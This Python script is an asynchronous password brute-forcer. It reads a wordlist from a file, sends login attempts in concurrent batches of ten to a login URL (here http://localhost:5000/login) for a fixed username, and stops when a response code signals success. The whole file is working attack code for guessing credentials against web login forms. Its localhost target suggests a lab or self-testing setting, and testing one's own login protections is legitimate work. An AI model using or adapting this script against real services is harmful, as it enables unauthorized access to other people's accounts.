from os import system
import requests
import asyncio
import httpx
import datetime
from timeit import default_timer as timer
from sys import exit
import time

# TODO: change requests to asyncio to perform multiple requests at the same time.
# TODO: Import PASSWORDS from a file.

# 1020318
PASSWORDS = [item.replace("\n", "") for item in open('easy.txt', 'r', encoding='utf8').readlines()]
TOTAL_PASSWORDS = len(PASSWORDS)
PASSWORDS = [PASSWORDS[x:x+10] for x in range(0, TOTAL_PASSWORDS, 10)]

start = timer()

async def do_request(url, user, username_field, password_field):
    for passwords in PASSWORDS: # passwords = chunk of 10 passwords.
        async with httpx.AsyncClient() as client:
            tasks = (client.post(url, data={username_field: user, password_field: password}) for password in passwords)
            reqs = await asyncio.gather(*tasks)

        time.sleep(0.1)

        results = [req for req in reqs]
        for id, result in enumerate(results):
            if result.status_code == 200 or result.status_code == 302:
                print('USER FOUND!!!!!!')
                print(result._request.body)
                end = timer()
                print('Total time', end-start)
                exit()
                break
    
    end = timer() 
    print('password not found...', end-start)


def do_users(url, username_field, password_field):
    asyncio.run(do_request(url, 'jorge_gonzalez', username_field, password_field))

def main():
    print("Passwords loaded..")
    print("Starting bruteforce...", datetime.datetime.now())
    do_users('http://localhost:5000/login', 'username', 'password')

if __name__ == '__main__':
    
    main()